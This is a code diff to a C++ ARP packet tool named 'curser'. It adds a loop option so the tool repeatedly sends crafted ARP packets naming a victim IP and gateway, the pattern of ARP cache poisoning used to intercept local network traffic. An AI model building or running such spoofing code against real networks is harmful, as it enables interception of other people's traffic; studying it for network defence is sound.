@@ -20,6 +20,7 @@ int main(int argc, char** argv) {
     static const char* usage = "Usage:  curser [ -<flag> [<val>] | --<name> [<val>] ]...\n\n   "
                                "-i, --interface-name       traffic output interface\n   "
                                "-o, --op-code              type of packet[req/rep]\n   "
+                               "-l, --loop                 retry count[default(1)]\n   "
                                "    --victim-ip            victim ip address\n   "
                                "    --dst-ip               gateway ip\n   "
                                "    --dst-mac              gateway mac address\n   "
@@ -32,6 +33,7 @@ int main(int argc, char** argv) {
     uint8_t sha[6]{0};
     uint8_t gha[6]{0};
     arp_op op;
+    int loop_count{1};
 
     if (argc < 11) {
         if (argc == 2 && (!std::strcmp(argv[1], "-h") || !std::strcmp(argv[1], "--help"))) {
@@ -57,6 +59,8 @@ int main(int argc, char** argv) {
                 perror("Invalid op code");
                 return EXIT_FAILURE;
             }
+        } else if (!std::strcmp(argv[i], "-l") || !std::strcmp(argv[i], "--loop")) {
+            loop_count = std::stoi(argv[++i]);
         } else if (!std::strcmp(argv[i], "--victim-ip")) {
             vpa = inet_bf(argv[++i]);
         } else if (!std::strcmp(argv[i], "--dst-ip")) {
@@ -72,23 +76,25 @@ int main(int argc, char** argv) {
 
 
     getMacAddr(ifname.data(), sha);
-
     ll_endpoint ep{ifname, sha};
     raw_socket sock{};
     sock.bind(ep);
 
-    auto pktBuilder = PktBuilder(op)
-            .set_hrd(0x0001)
-            .set_pro(0x0800)
-            .set_hln(6)
-            .set_pln(4)
-            .set_sha(sha)
-            .set_spa(vpa)
-            .set_tpa(gpa)
-            .set_tha(gha)
-            .set_op(as_integer(op));
+    for (int i = 0; i < loop_count; ++i) {
+        auto pktBuilder = PktBuilder(op)
+                .set_hrd(0x0001)
+                .set_pro(0x0800)
+                .set_hln(6)
+                .set_pln(4)
+                .set_sha(sha)
+                .set_spa(vpa)
+                .set_tpa(gpa)
+                .set_tha(gha)
+                .set_op(as_integer(op));
 
-    sock.sendto(pktBuilder.packet(), pktBuilder.size());
-    std::cout << "sent arp packet on the interface " << ep << std::endl;
+        sock.sendto(pktBuilder.packet(), pktBuilder.size());
+        std::cout << "sent arp packet on the interface " << ep << std::endl;
+    }
+
     return EXIT_SUCCESS;
 }
